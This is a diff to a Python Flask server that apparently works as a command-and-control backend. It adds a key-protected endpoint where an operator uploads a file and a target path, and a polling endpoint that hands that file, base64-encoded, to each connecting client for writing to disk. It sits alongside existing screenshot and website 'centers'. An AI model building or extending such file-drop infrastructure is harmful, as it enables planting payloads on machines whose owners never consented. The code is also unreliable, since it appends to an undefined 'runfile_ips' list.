@@ -28,8 +28,29 @@ screenshot_ips: list[str] = []
 website: str = ""
 website_ips: list[str] = []
 
+dropfile: bytes = b""
+dropfile_location: str = ""
+dropfile_ips: list[str] = []
+
 
 # Centers
+
+
+@app.route("/dropfile-center", methods=["GET"])
+def runfile_center() -> Response:
+    global dropfile_location, dropfile_ips, dropfile
+    if len(dropfile) == 0:
+        return Response("no files to drop", 204)
+    else:
+        remote_ip = get_remote_address()
+        if remote_ip in dropfile_ips:
+            return Response("u cant do that rn", 400)
+        else:
+            runfile_ips.append(remote_ip)
+            return {
+                "dropfile": b64encode(dropfile).decode(),
+                "location": dropfile_location,
+            }
 
 
 @app.route("/website-center", methods=["GET"])
@@ -196,6 +217,19 @@ def post_website() -> Response:
         return Response("invalid key", 403)
 
 
+@app.route("/post_dropfile", methods=["POST"])
+def post_dropfile() -> Response:
+    if check_key(request.args.get("key")):
+        global dropfile_location, dropfile
+
+        dropfile = request.files["dropfile"].stream.read()
+        dropfile_location = request.args.get("location")
+        Thread(target=post_dropfile_thread, args=[dropfile, dropfile_location]).start()
+        return Response("success", 200)
+    else:
+        return Response("invalid key", 403)
+
+
 # Threads
 
 
@@ -248,6 +282,16 @@ def post_website_thread(website_arg: str) -> None:
     sleep(8)
     website = ""
     website_ips = []
+
+
+def post_dropfile_thread(data: bytes, location: str) -> None:
+    global dropfile_location, dropfile_ips, dropfile
+    dropfile = data
+    dropfile_location = location
+    sleep(8)
+    dropfile = b""
+    dropfile_location = ""
+    dropfile_ips = []
 
 
 # Static
